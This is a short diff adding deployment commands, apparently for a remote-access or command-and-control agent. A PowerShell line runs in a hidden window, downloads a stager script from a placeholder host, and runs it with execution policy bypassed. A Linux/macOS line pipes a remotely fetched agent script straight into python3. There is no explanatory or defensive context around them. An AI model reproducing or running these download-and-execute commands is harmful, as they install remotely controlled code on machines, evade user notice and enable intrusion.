@@ -1,0 +1,5 @@
+# Windows PowerShell (Run as Admin for Persistence)
+powershell -w hidden -c "iwr -Uri http://your-ip:5000/payload/stager.ps1 -OutFile $env:temp\stager.ps1; powershell -ExecutionPolicy Bypass -File $env:temp\stager.ps1"
+
+# Linux / macOS
+curl -s http://your-ip:5000/payload/agent.py | python3 -
